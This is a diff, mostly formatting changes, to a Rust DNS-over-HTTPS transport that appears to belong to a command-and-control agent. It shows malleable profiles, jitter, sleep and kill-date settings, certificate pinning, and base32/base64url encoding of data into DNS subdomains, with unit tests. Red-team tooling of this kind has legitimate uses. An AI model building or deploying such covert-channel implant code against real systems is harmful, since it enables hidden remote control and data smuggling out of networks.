@@ -43,14 +43,14 @@
 //! - Jitter comes from the profile's global config, not hardcoded values
 
 use anyhow::{anyhow, Result};
-use rand::Rng;
 use async_trait::async_trait;
 use base64::Engine;
 use common::{CryptoSession, Message, Transport};
+use rand::Rng;
 use sha2::{Digest, Sha256};
-use subtle::ConstantTimeEq;
 use std::sync::atomic::{AtomicU32, Ordering};
 use std::sync::Arc;
+use subtle::ConstantTimeEq;
 use tokio::time::Duration;
 
 use crate::malleable::MalleableProfile as AgentMalleableProfile;
@@ -112,9 +112,7 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
             // that could brute-force the expected fingerprint byte-by-byte.
             let expected_lower = expected.to_lowercase();
             if !bool::from(hex_fp.as_bytes().ct_eq(expected_lower.as_bytes())) {
-                log::error!(
-                    "cert pinning: fingerprint mismatch — rejecting connection"
-                );
+                log::error!("cert pinning: fingerprint mismatch — rejecting connection");
                 return Err(rustls_0_21::Error::InvalidCertificate(
                     rustls_0_21::CertificateError::UnknownIssuer,
                 ));
@@ -137,8 +135,14 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
 
             Ok(rustls_0_21::client::ServerCertVerified::assertion())
         } else {
-            self.webpki
-                .verify_server_cert(end_entity, intermediates, server_name, scts, ocsp_response, now)
+            self.webpki.verify_server_cert(
+                end_entity,
+                intermediates,
+                server_name,
+                scts,
+                ocsp_response,
+                now,
+            )
         }
     }
 
@@ -175,8 +179,7 @@ fn encode_subdomain(data: &[u8], encoding: &str) -> String {
             base32::encode(base32::Alphabet::RFC4648 { padding: false }, data).to_ascii_lowercase()
         }
         "base64url" => {
-            let b64 =
-                base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data);
+            let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data);
             // DNS-safe substitutions for extra safety.
             b64.replace('+', "-").replace('/', "_")
         }
@@ -552,7 +555,10 @@ impl DohTransport {
                     if _rdlength == 4 {
                         let ip = format!(
                             "{}.{}.{}.{}",
-                            data[pos], data[pos + 1], data[pos + 2], data[pos + 3]
+                            data[pos],
+                            data[pos + 1],
+                            data[pos + 2],
+                            data[pos + 3]
                         );
                         answers.push(serde_json::json!({
                             "type": 1,
@@ -808,9 +814,8 @@ impl Transport for DohTransport {
 mod tests {
     use super::*;
     use crate::malleable::{
-        DnsConfig, GlobalConfig, HttpTransformConfig, HttpTransactionConfig,
-        MalleableProfile as AgentMalleableProfile, ProfileInfo, SslConfig,
-        TransformType,
+        DnsConfig, GlobalConfig, HttpTransactionConfig, HttpTransformConfig,
+        MalleableProfile as AgentMalleableProfile, ProfileInfo, SslConfig, TransformType,
     };
     use std::collections::HashMap;
 
@@ -826,6 +831,7 @@ mod tests {
                 user_agent: "TestAgent/1.0".to_string(),
                 jitter: 10,
                 sleep_time: 30,
+                sleep_time_ms: None,
                 dns_idle: "0.0.0.0".to_string(),
                 dns_sleep: 0,
             },
@@ -864,7 +870,9 @@ mod tests {
         let data = b"hello dns world";
         let encoded = encode_subdomain(data, "base32");
         // Base32 should be lowercase letters or digits 2-7 (DNS-safe).
-        assert!(encoded.chars().all(|c| c.is_ascii_lowercase() || ('2'..='7').contains(&c)));
+        assert!(encoded
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || ('2'..='7').contains(&c)));
         // No padding.
         assert!(!encoded.contains('='));
         let decoded = decode_subdomain(&encoded, "base32").unwrap();
@@ -1009,7 +1017,9 @@ mod tests {
             kill_date: String::new(),
         };
 
-        let wire = transport.build_dns_wireformat("test.example.com", "A").unwrap();
+        let wire = transport
+            .build_dns_wireformat("test.example.com", "A")
+            .unwrap();
         // Should have at least 12 bytes header + question.
         assert!(wire.len() > 12);
         // Transaction ID should be non-zero (random).
